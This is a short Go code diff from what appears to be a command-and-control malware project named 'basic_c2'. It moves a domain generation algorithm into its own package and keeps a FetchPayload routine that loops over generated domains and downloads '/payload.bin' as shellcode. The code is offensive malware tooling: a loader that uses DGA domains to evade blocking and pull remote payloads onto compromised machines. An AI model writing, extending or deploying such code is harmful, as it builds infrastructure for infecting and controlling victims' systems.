@@ -2,9 +2,8 @@ package fetch
 
 import (
 	"basic_c2/internal/config"
-	"crypto/md5"
+	"basic_c2/internal/dga"
 	"crypto/tls"
-	"encoding/hex"
 	"fmt"
 	"io"
 	"net/http"
@@ -12,7 +11,7 @@ import (
 )
 
 // GenerateDGADomains 生成 DGA 域名列表
-func GenerateDGADomains(count int) []string {
+/*func GenerateDGADomains(count int) []string {
 	domains := make([]string, 0)
 	dateStr := time.Now().Format("2006-01-02")
 	
@@ -26,7 +25,7 @@ func GenerateDGADomains(count int) []string {
 	}
 	
 	return domains
-}
+}*/
 
 // DownloadBytes 下载文件内容
 func DownloadBytes(url string) ([]byte, error) {
@@ -69,7 +68,7 @@ func FetchPayload() ([]byte, error) {
 	var err error
 
 	// 1. 尝试 DGA 域名
-	dgaBaseDomains := GenerateDGADomains(config.DGACount)
+	dgaBaseDomains := dga.GenerateDomains(config.DGACount)
 	for _, domain := range dgaBaseDomains {
 		downloadURL := domain + "/payload.bin"
 		shellcode, err = DownloadBytes(downloadURL)
